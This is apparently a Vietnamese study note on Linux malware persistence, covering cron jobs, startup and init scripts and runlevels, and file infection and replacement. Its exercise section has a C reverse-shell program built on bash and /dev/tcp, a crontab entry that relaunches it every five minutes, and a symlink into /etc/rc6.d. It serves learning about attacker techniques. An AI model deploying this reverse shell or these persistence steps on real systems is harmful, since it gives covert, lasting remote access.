# Các kỹ thuật persistence

## Cron Jobs

- Cron Jobs là một ứng dụng để lập lịch chạy ứng dụng của Linux.

- Malware sử dụng Cron Jobs để lập lịch chạy, duy trì sự tồn tại trên hệ thống.

## Subsystems Initialization

- Startup Script là các script được chạy cùng với sự khởi động của hệ thống. Ví dụ: etc/rc.local/, /etc/init.d/

- Các script trong /etc/rc*.d/ được sử dụng để khởi động và dừng các dịch vụ hệ thống ở các runlevel khác nhau. Các level chạy của hệ thống:

  - Runlevel0: hệ thống tắt.
 
  - Runlevel1: chế độ đơn người dùng. Chỉ có hệ thống cơ bản và các dịch vụ tối thiểu được khởi động. Không có mạng, và thường chỉ có người dùng root có thể đăng nhập.
 
  - Runlevel2: chế độ đa người dùng mà không có mạng. Đa số các dịch vụ cơ bản và môi trường làm việc nhiều người dùng được khởi động, nhưng các dịch vụ mạng không được kích hoạt.
 
  - Runlevel3: chế độ đa người dùng có mạng. Tất cả các dịch vụ cơ bản và mạng đều được khởi động, nhưng không có môi trường desktop đồ họa.
 
  - Runlevel4: chưa được sử dụng hoặc dành cho mục đích đặc biệt. Người dùng có thể tùy chỉnh runlevel này để đáp ứng các nhu cầu cụ thể.
 
  - Runlevel5: chế độ đa người dùng với môi trường đồ họa. Tất cả các dịch vụ và mạng đều được khởi động, bao gồm cả môi trường desktop đồ họa.
 
  - Runlevel6: hệ thống khởi động lại.
 
- Init scripts là các script được chạy bởi tiến trình init(systemd) khi hệ thống khởi động. Ví dụ: /etc/systemd/system/ 

## File Infection and Replacement

- File Infection:

  - Appended Infection: Mã độc được thêm vào cuối một tệp hợp lệ.
 
  - Prepended Infection: Mã độc được thêm vào đầu một tệp hợp lệ.
 
  - Cavity Infection: Mã độc được thêm vào giữa một tệp hợp lệ.

- File Replacement: Mã độc thay thế một tệp hợp lệ thành một tệp độc hại cùng tên.

# Bài tập

## Malware:

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
    const char *ip = argv[1];
    int port = atoi(argv[2]);
    char commad[MAX_BUFFER_SIZE];
    sprintf(commad, "bash -c \"/bin/bash -i >& /dev/tcp/%s/%d 0>&1\"", ip, port);
    system(commad);
    return 0;
}
```

## Bài 1:

```
crontab -e
*/5 * * * * /path/to/reverse-shell 127.0.0.1 1234
```

## Bài 2:

```
ln -s /path/to/malware /etc/rc6.d/malware
```
